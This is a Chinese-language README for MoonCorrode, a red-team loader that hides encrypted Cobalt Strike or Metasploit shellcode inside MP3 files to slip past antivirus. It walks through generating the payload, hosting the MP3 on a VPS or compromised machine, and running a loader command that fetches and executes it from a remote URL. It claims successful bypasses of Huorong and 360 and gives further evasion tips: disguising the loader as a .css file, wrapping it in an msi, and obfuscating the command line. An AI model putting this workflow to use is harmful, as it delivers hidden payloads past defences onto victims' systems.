# MoonCorrode月蚀 / ShellCodeToLSBMP3

## Code By:Tas9er / A.E.0.S Security Team

![theme](image\theme.jpg)

##### :underage:项目概述

***MoonCorrode是一款专为红队攻防演练设计的高效、模块化ShellCode读写分离加密以及加载器，旨在通过动态技术绕过主流杀毒软件检测，实现隐蔽化payload注入与执行。项目基于Python3.11开发，助力红队在复杂防御环境中完成权限维持、横向渗透等战术目标。***



##### :x:警告说明​

**A.本项目仅作为网络安全技术研究与授权测试用途，使用者应严格遵守《中华人民共和国网络安全法》《中华人民共和国数据安全法》《中华人民共和国刑法》等相关法律法规。项目开发者不对任何未经授权或非法使用行为承担法律责任，亦不对因项目使用导致的直接或间接损失负责，声明任何使用者下载后24小时内删除。**

**B.没有后门，放心使用**



##### :fish:使用说明​

使用Cobalt Strike或者Metasploit生成Python格式的Payload文件，默认强制性文件为payload.py

![01](image\01.jpg)

payload.py放置在ShellCodeEncrypt.exe相同目录下，同级目录下还有自带的The Tsukimori Song.mp3，当然了使用者也可以自己准备一个mp3文件，建议使用自带，如果自己准备mp3文件的话，建议音频大小超过4MB，否则会出现一些问题。

运行ShellCodeEncrypt.exe，可以指定参数file指定自定义的mp3音频文件，默认使用自带mp3音频文件

会在同级目录生成一个新的mp3，mp3隐写数据：AES加密的IV，KEY以及加密后的ShellCode，当然了这个IV和KEY攻击者无需记录。

![02](image\02.jpg)

可以把生成新的mp3文件存储在VPS，肉鸡，或者任何其他任何HTTP请求网络资源上，需要记住这个自定义地址。

肉鸡演示例如：http://xxx.xxx.xxx.xxx:8084/1745976130.mp3

ShellCodeLoader.exe需要上传至服务器端，执行命令ShellCodeLoader.exe --cnm=http://xxx.xxx.xxx.xxx:8084/1745976130.mp3



##### :heavy_check_mark:杀软绕过上线测试​

###### 火绒(病毒样本库:2025.04.29)

![03](image\03.png)

###### 360安全卫士(病毒样本库:2025.04.30，多引擎)

![04](image\04.png)



##### :red_circle:其他绕过提示

1.ShellCodeLoader.exe可以改成xxxx.css，命令行使用cmd.exe /c xxxx.css --cnm=xxx

2.封装msi远程调用

3.使用DOSfuscation进行命令行全局混淆

4.ShellCodeLoader源代码公开，闲的没事做的人可以改改，有的憨批厂商喜欢用Hash做特征，哄堂大孝了家人们



##### :ocean:致敬

**本项目致敬恐怖单机游戏《零:月蚀的假面》**
